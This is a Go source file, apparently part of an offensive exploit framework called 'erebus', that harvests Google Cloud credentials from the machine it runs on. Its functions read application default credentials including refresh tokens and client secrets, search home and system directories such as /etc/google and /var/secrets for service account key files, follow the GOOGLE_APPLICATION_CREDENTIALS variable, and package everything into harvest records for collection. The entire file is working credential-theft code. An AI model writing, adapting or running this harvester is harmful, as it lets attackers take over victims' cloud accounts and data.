package cloud

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

// harvestGCP reads GCP credential files, service account keys, and application
// default credentials. Cross-platform.
func harvestGCP(_ context.Context) []*pb.CloudHarvestResult {
	var results []*pb.CloudHarvestResult

	// 1. Application Default Credentials
	if r := harvestGCPADC(); r != nil {
		results = append(results, r)
	}

	// 2. gcloud CLI credentials
	if r := harvestGCloudCreds(); r != nil {
		results = append(results, r)
	}

	// 3. Service account key files in common paths
	if r := harvestGCPServiceAccountKeys(); r != nil {
		results = append(results, r)
	}

	// 4. Environment variable
	if r := harvestGCPEnv(); r != nil {
		results = append(results, r)
	}

	return results
}

func harvestGCPADC() *pb.CloudHarvestResult {
	home, _ := os.UserHomeDir()
	adcPath := filepath.Join(home, ".config", "gcloud", "application_default_credentials.json")

	// Also check GOOGLE_APPLICATION_CREDENTIALS env var
	if envPath := os.Getenv("GOOGLE_APPLICATION_CREDENTIALS"); envPath != "" {
		if cred := parseGCPServiceAccountKey(envPath); cred != nil {
			return &pb.CloudHarvestResult{
				Provider:    "gcp",
				Method:      "application_default_credentials",
				Credentials: []*pb.CloudCredential{cred},
			}
		}
	}

	data, err := os.ReadFile(adcPath)
	if err != nil {
		return nil
	}

	var adc struct {
		ClientID     string `json:"client_id"`
		ClientSecret string `json:"client_secret"`
		RefreshToken string `json:"refresh_token"`
		Type         string `json:"type"`
	}

	if err := json.Unmarshal(data, &adc); err != nil {
		return nil
	}

	result := &pb.CloudHarvestResult{
		Provider: "gcp",
		Method:   "application_default_credentials",
	}

	if adc.RefreshToken != "" {
		result.Tokens = append(result.Tokens, &pb.CloudToken{
			Provider:     "gcp",
			TokenType:    "refresh_token",
			RefreshToken: adc.RefreshToken,
			ClientId:     adc.ClientID,
			Source:       adcPath,
		})
	}

	if adc.ClientSecret != "" {
		result.Credentials = append(result.Credentials, &pb.CloudCredential{
			Provider: "gcp",
			CredType: "client_secret",
			Identity: adc.ClientID,
			Secret:   adc.ClientSecret,
			Source:   adcPath,
		})
	}

	if len(result.Tokens) == 0 && len(result.Credentials) == 0 {
		return nil
	}
	return result
}

func harvestGCloudCreds() *pb.CloudHarvestResult {
	home, _ := os.UserHomeDir()
	credDBPath := filepath.Join(home, ".config", "gcloud", "credentials.db")

	// credentials.db is a SQLite database — check existence
	info, err := os.Stat(credDBPath)
	if err != nil {
		return nil
	}

	// M5: Report existence with size info for assessment
	return &pb.CloudHarvestResult{
		Provider: "gcp",
		Method:   "gcloud_cli",
		Metadata: fmt.Sprintf("gcloud credentials.db found at: %s (size: %d bytes)", credDBPath, info.Size()),
	}
}

func harvestGCPServiceAccountKeys() *pb.CloudHarvestResult {
	result := &pb.CloudHarvestResult{
		Provider: "gcp",
		Method:   "service_account_keys",
	}

	// Common paths where service account keys are stored
	home, _ := os.UserHomeDir()
	searchDirs := []string{
		filepath.Join(home, ".config", "gcloud"),
		filepath.Join(home, "keys"),
		filepath.Join(home, "credentials"),
	}

	if runtime.GOOS == "linux" {
		searchDirs = append(searchDirs,
			"/etc/google",
			"/var/secrets",
		)
	}

	found := false
	for _, dir := range searchDirs {
		// M6: Check directory existence first to reduce noise
		if _, err := os.Stat(dir); err != nil {
			continue
		}
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}

		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}
			if filepath.Ext(entry.Name()) != ".json" {
				continue
			}

			path := filepath.Join(dir, entry.Name())
			cred := parseGCPServiceAccountKey(path)
			if cred != nil {
				result.Credentials = append(result.Credentials, cred)
				found = true
			}
		}
	}

	if !found {
		return nil
	}
	return result
}

func parseGCPServiceAccountKey(path string) *pb.CloudCredential {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}

	var key struct {
		Type                    string `json:"type"`
		ProjectID               string `json:"project_id"`
		PrivateKeyID            string `json:"private_key_id"`
		PrivateKey              string `json:"private_key"`
		ClientEmail             string `json:"client_email"`
		ClientID                string `json:"client_id"`
	}

	if err := json.Unmarshal(data, &key); err != nil {
		return nil
	}

	if key.Type != "service_account" || key.PrivateKey == "" {
		return nil
	}

	// M16: Send key metadata instead of full private key to reduce exposure.
	// Include key ID and a truncated fingerprint for identification.
	keyPreview := key.PrivateKeyID
	if keyPreview == "" && len(key.PrivateKey) > 40 {
		keyPreview = key.PrivateKey[:40] + "...[truncated]"
	}

	return &pb.CloudCredential{
		Provider: "gcp",
		CredType: "service_account",
		Identity: key.ClientEmail,
		Secret:   keyPreview,
		Extra:    key.ProjectID,
		Source:   path,
	}
}

func harvestGCPEnv() *pb.CloudHarvestResult {
	credPath := os.Getenv("GOOGLE_APPLICATION_CREDENTIALS")
	if credPath == "" {
		return nil
	}

	cred := parseGCPServiceAccountKey(credPath)
	if cred == nil {
		return nil
	}

	return &pb.CloudHarvestResult{
		Provider:    "gcp",
		Method:      "env_var",
		Credentials: []*pb.CloudCredential{cred},
	}
}
